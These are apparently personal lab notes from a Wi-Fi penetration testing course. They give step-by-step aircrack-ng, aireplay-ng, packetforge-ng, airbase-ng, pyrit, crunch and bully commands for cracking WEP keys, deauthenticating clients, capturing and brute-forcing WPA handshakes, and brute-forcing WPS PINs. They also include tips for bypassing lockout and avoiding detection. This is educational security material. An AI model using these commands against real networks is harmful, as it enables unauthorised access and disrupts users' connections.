[[Wi-Fi Pentest]]
# WEP
The main flaws of WEP encryption are:
- Weak authentication scheme
- Short IV and subsequent frequent reuse
- Vulnerable to replay attacks
- Weak frame integrity protection
- Low resistance to related key attacks enabling efficient statistical attacks.
## Lab Setup
- Access Point (SSID: LabNetwork)
- 1 victim STA (associated to LabNetwork)
- the attacker machine
- Set up AP to use WEP encryption
- Set the WEP key size to 40 bit and choose your key (10 hex chars)
- Associate a victim to the network.
- Setup attack machine:
	- `airmon-ng start <interface>`
- Sniff the network traffic with airodump-ng:
	- `airodump-ng -c <channel> -w wep_attack <interface>`
## Deauthentication Attack
Management frame is not encrypted with WEP in IEEE 802.11
Death attack:
- `aireplay-ng -0 10 -c <client_mac> -a <bssid> <intf>`
- Attack can be noticed because you force clients to deauthenticate.
## ARP Relay Attack
After sniffing an ARP request generated by a STA, you can re-inject that packet due to WEP's lack of message replay countermeasures.
It's a broadcast message, the AP will forward the request to the associated STAs and each of these requests will contain a new IV for you to collect.
### An overview
![[Снимок экрана 2023-09-24 в 17.55.07.png]]
fake authentication is an authentication for attacker machine with 4 frames exchange.
![[Снимок экрана 2023-09-24 в 17.55.50.png]]
![[Снимок экрана 2023-09-24 в 17.56.27.png]]![[Снимок экрана 2023-09-24 в 17.57.17.png]]
![[Снимок экрана 2023-09-24 в 17.57.35.png]]
![[Снимок экрана 2023-09-24 в 17.57.54.png]]![[Снимок экрана 2023-09-24 в 17.58.25.png]]
### Actual attack
#### Collecting frames with IVs
Step 1:
> associate to the AP with aireplay-ng:
> `aireplay-ng -1 15 -a <bssid> -e <ssid> <intf>`![[Снимок экрана 2023-09-24 в 17.59.39.png]]
> During a real attack, you can find that your adapter constantly receives deauth messages from the victim AP. You can try this variation for picky APs:
> `aireplay-ng -1 6000 -q 10 -o 1 -a <bssid> -e <ssid> <intf>`
> -q 10 - enable keep-alive packets to be sent every 10 seconds to maintain the auth status.
> -o 1 forces aireplay-ng to send one set of packets at a time.

Step 2:
> We need to listen for ARP requests sent by clients on the network.
> `aireplay-ng -3 -b <bssid> <intf>`![[Снимок экрана 2023-09-24 в 18.04.17.png]]
> aireplay-ng is saving ARP requests to a file.

Step 3:
> Capture at least an ARP request

Step 4:
> Almost instantly aireplay-ng will start to re-inject the captured ARP request.

Step 5:
> Airodump-ng will show the increase in received data frames as you are flooding the AP.
### The last phase of the attack
aircrack-ng is a software that encapsulates a series of cracking techniques for both WEP and WPA network keys. 
40 bit keys will require about 5k IVs to be cracked while 104 bits keys could require a number ten times higher or more.
If the AP implements some sort of protection then a number of packets can be higher.
The basic aircrack-ng syntax:
`aircrack-ng -n <key_length> <.cap file(s)>`
-n - specify the WEP key length - 128 bits default
![[Снимок экрана 2023-09-24 в 18.46.41.png]]
![[Снимок экрана 2023-09-24 в 18.47.59.png]]
PTW is a WEP cracking techinque developed in 2007 that exploits correlations discovered between the RC4 keystream and the key itself.
![[Снимок экрана 2023-09-25 в 13.37.00.png]]
We have to launch ARP gathering attack in order for cracking to work.
![[Снимок экрана 2023-09-25 в 13.38.26.png]]
Korek statistical methods - -K flag.
## Clientless WEP cracking
- airodump-ng shows no clients.
- Use aireplay-ng fragmentation attack to get a PRGA stream. PRGA represents a keystream generated by the RC4 cipher used in WEP encryption.
- once we have a keystream, we can encrypt any packet and inject it. In this way, we can forge an ARP request, encrypt it and still use the old ARP replay technique.
Step 1:
- Authenticate to the AP with aireplay-ng - fake authentication as usual:
	- `aireplay-ng -1 6000 -q 10 -a <BSSID> <interface>`.
	- Do not change the source MAC address when running this or other commands.
- start aireplay-ng fragmentation attack:
	- `aireplay-ng -5 -b <BSSID> -c <source_mac> <interface>`
- at some point, if you are lucky you will get a data packet transmitted from the AP. These are distinguishable by the FromDS bit set to 1.
- If you received a FromDS set to 1, then fragmentation attack starts. aireplay-ng saves the obtained keystream to a file so now we can forge packets with it.
- `not enought acks, repeating` - aircrack-ng documentation suggests to move closer or farther away from the AP.
- With the captured PRGA we now build an ARP request packet using this command: `packetforge-ng -0 -a <BSSID> -h <source_mac> -k <ip1> -l <ip2> -y <prga.xor> -w outfile`. This command creates the packet and saves it to the specified output file.
	- -0 flag tells packetforge-ng that we want to build an ARP request looking for the MAC address of ip1 (the -k option). ip2 is the IP address that is starting the request (-l option). As usual, we set the BSSID of the target network and use our wireless adapter MAC address as the source (-h option)
- Output:![[Снимок экрана 2023-09-25 в 18.27.14.png]]
- `aireplay-ng -2 -r <packet-file> <interface>` - to inject the forged ARP request, we use aireplay-ng interactive mode.![[Снимок экрана 2023-09-25 в 18.29.10.png]]
- Now again we can gather IVs and run aircrack-ng as we have previously seen.
## Bypassing Shared Key Authentication
When using SKA, station wants to associate to an AP and it needs to know the WEP key, otherwise its authentication request would be discarded and consequently it would not be able to associate and communicate with other stations.
Steps in this attack:
1. Deauthenticate one victim client
2. Obtain keystream from captured authentication frames
3. Authenticate with the AP using recovered keystream
4. Initiate ARP replay attack
### Lab Setup
- Access Point
- 1 victim STA
- The attacker machine
- WEP encryption using Shared Key Authentication system.
### Actual attack
Step 1 - Deauthenticate the client:
`airodump-ng -c <channel> -w shared <interface>`
`aireplay-ng -0 0 -e <SSID> -c <client_MAC> <interface>`
Step 2 - Check airodump-ng terminal and see a message which informs you a keystream was recovered. The recovered keystream will be saved in a .xor file located in the airodump-ng working directory. 
Step 3 - now we have a reusable keystream. We can try to authenticate ourselves with the target AP. Launch aireplay-ng fake authentication attack:
`aireplay-ng -1 6000 -q 10 -e <SSID> -y <file.xor> <int>`![[Снимок экрана 2023-09-25 в 18.48.41.png]]
Successful authentication.
Step 4 - perform an ARP replay as we learned before.
## Attacking the client
Unassociated client periodically sends out Probe Requests on every channel searching for the wireless network it is configured to use. It doesn't know about changes of MAC address of AP, so it sends only SSID.
The attacker starts a fake AP advertising as the target network. As mutual authentication is not enforced by WEP security, the client will simply sense that its preffered AP is in range and try to associate with it.
Most wireless clients upon association to a network, will send out a few gratuitous ARP and DHCP requests. These packets are encrypted!
A basic form of the attack could - deauthenticate the client and restart the process over and over until a sufficient amount of IVs has been gathered. This could take a lot of time.

The solution is another attack on WEP - bits flipping in the packet payload and then adjust the corresponding ICV, a CRC 32-field calculated on the encrypted data, obtaining a perfectly valid packet.

Once a gratuitous ARP packet is received, it is possible to flip certain bytes and forge a new ARP request targeting the client. it is now possible to flood the client with these ARP requests and collect a huge amount of encrypted packets in a few minutes.
## Practical Caffe-Latte Attack
Lab assume the following:
- Your target network AP is switched off or out of reach.
- A client with a pre-configured WEP key for the target network is in range and unassociated to any wireless network.
- You have another device that you will use as your attack point.
`airodump-ng -w <outfile> <interface>`![[Снимок экрана 2023-09-25 в 19.42.53.png]]
A good tip is to fix the channel in airodump-ng using the -c option.
airbase-ng - tool for rogue AP and evil-twin.
`airbase-ng -c <channel> -W 1 -L -e <SSID> <interface>`
airbase-ng - tool to transform your wireless adapter in a Wi-Fi access point for a series of purposes. 
The -L switch is used to enable Caffe-Latte Attack so nothing special about it.
The -e option sets airbase-ng to act as an AP for the specified SSID.
As usual -c fixes the wireless channel. 
-W 1 simply force airbase-ng to not set the WEP privacy bit in beacons.
![[Снимок экрана 2023-09-25 в 19.47.40.png]]
![[Снимок экрана 2023-09-25 в 19.48.02.png]]
After gathering about 15k IVs, we got the key!![[Снимок экрана 2023-09-25 в 20.02.25.png]]
There is a variation to this attack that you can perform using airbase-ng. It's called Hirte Attack.
This attack uses the same tactics targeting the client but also uses frame fragmentation to achive an higher speed as the same ARP request can be split into multiple shorter encrypted frames. 
# WPA/WPA2
WPA is robust security measure to provide effective privacy for wireless networks.
When a client wants to join a WPA/WPA2 protected network, it must first authenticate itself, proving it owns the shared key.
After association, the 2 parties start what is called the Four-Way handshake. A process that permits the mutual authentication between the AP(Authenticator) and the STA(Supplicant).
## Four Way handshake
During the communication, the PSK is never sent through the wireless medium. The PSK is only used to generate a PTK (Pairwise Transient Key) that is used as session-only encryption key.
Both AP and STA need a secure way to generate the PTK. This is what the 4-way handshake does.
![[Снимок экрана 2023-09-26 в 22.37.52.png]]
### 1. Generate PMK (Pairwise Master Key)
PMK - 256. bits long - PSK + SSID. AP and STA generate PMK.
### 2. AP sends ANonce to STA
### 3. Build PTK (Pairwise Transient Key)
PTK - PBKDF2-SHA1(PMK + ANonce + SNonce + MAC address AP + MAC address STA)
### 4. STA sends SNonce + MIC
MIC - Message Integrity Code
### 5. AP sends GTK + MIC
GTK - Group Temporal Key - used to decrypt multicast and broadcast traffic. 
### 6. STA sends MIC

## Brute-Force against Four-Way handshake
For a brute-force to work, we have to capture the 4-way handshake.
## Capture the handshake
### Lab Setup
- AP (SSID, channel 11, WPA enabled)
- 1 victim STA associated to the AP
- The attacker PC
### Airodump-ng
`airodump-ng -w <outfile> -c <channel> <interface>`
### Deauth attack
`aireplay-ng -0 1 -a <BSSID> -c <client_mac> <iface>`
STA will rejoin the network and you will capture its 4-way handshake.
### Brute-force
Dictionary or each symbol.
`aircrack-ng -w <wordlist> <.cap file>`
## Build a wordlist with a crunch
`crunch <min_length> <max_length>`
`crunch 8 8 -o my_words.lst`
`crunch 8 8 | aircrack-ng -e LabNetwork file.cap -w -`
## Test computer power
`aircrack-ng -S`
## Exploit the GPU power
- oclHashcat
- Pyrit
- John the Ripper
## Cracking as a Service

## Space-time tradeoff
Trend - make use of the time-space tradeoff to pre-calculate large amount of hashes and store them in so-called rainbow tables.
![[Снимок экрана 2023-09-26 в 23.25.42.png]]
For every PSK you want to try against the handshake, you firstly need to calculate the PMK. 
Then using the values obtained from handshake, generate the PTK. Finally, you calculate the MIC and compare it with the one in the handshake.
The straightforward outlined cracking process has one important flaw: it is slow!
PBKDF2 requires running 4096 iterations of the HMAC algorithm that is actually designed to be coomputationally expensive.

One way to speed up the process is to pre-calculate the PMK for all of the various passphrases in your wordlist.
In theory, this would be a huge speed improvement as now every time you want to crack a WPA handshake, you only have to generate the PTK and compare MICs, both of these operations are much faster than the PBKDF2 function.

However, WPA authors thought about this possibility when they were designing the protocol and they came up with a pretty clever but simple solution.
PMKs must be calculated for each SSID name you are interested in cracking.

For using rainbow-tables we will use pyrit tool written in Python.
### Pyrit
`pyrit eval` - check the database status.
`pyrit -i <wordlist_file> import_passwords` - import some passwords from our wordlist. It will discard all duplicates and all the words that are not suitable for a PSK.
`pyrit -e <ssid> create_essid` - provide a SSID name to pyrit.
`pyrit batch` - pyrit will start building your database for the included SSIDs and password combinations.
`pyrit -r <.cap file> attack_db` -initiate the attack against the handshake.![[Снимок экрана 2023-09-26 в 23.36.04.png]]
### We can use prebuild PMK databases.
# WPS
WPS was designed as a simple and secure way to setup a protected wireless network.
WPS setup methods:
- Push-Button-Connect
- Internal-Registrar
- External-Registrar
External-registrar - method only requires the client to provide a PIN. PIN is 8 digits number.
10^8 combination to crack. But form of authentication used by WPS highly reduces this number.
Visual representation of WPS PIN number:
![[Снимок экрана 2023-09-26 в 23.44.48.png]]
Authentication process looks like this:
![[Снимок экрана 2023-09-26 в 23.45.19.png]]
At every step if the client is sending wrong data the AP terminates the process and sends a NACK packet.
This behavior, combined with the split PIN allows us to build a quite optimized brute force attack:
![[Снимок экрана 2023-09-26 в 23.47.47.png]]
10^8 splits into 10^4 + 10^4 = 20k while having a checksum reduces the number of guesses for the second half - 10^4 + 10^3 = 11k combinations.
2 tools:
- Reaver (wash - tool to find vulnerable APs)
- Bully
## Wash
`wash -i <interface>` - monitor interface up and running, launch this.
wash will start hopping though the wireless channels and will list discovered APs that support WPS as shown below:
![[Снимок экрана 2023-09-26 в 23.51.01.png]]
WPS Locked specifies if a corresponding AP disabled WPS due to internal anti-bruteforce protection.
Once you are sure your target AP is vulnerable launch bully:
`bully -b <BSSID> <inteface>`
![[Снимок экрана 2023-09-26 в 23.52.47.png]]
## Protection against attack on WPS
The protection is called WPS lockdown and it is simply a self-defense procedure that temporary disables WPS registration if a repeated number of attempts to register is detected.
bully will show lockout:
`WPS lockout reported, sleeping for 43 seconds...`
Force bully to continue attack besides enabled protection:
`bully -b <BSSID> -L <interface>`
To avoid detection add some delay after every PIN attempt
Syntax to enable delay for the bully command goes as follows:
`bully -b <BSSID> -1 <seconds> -2 <seconds> <interface>`
-1 - delay in a first phase
-2 - delay in a second phase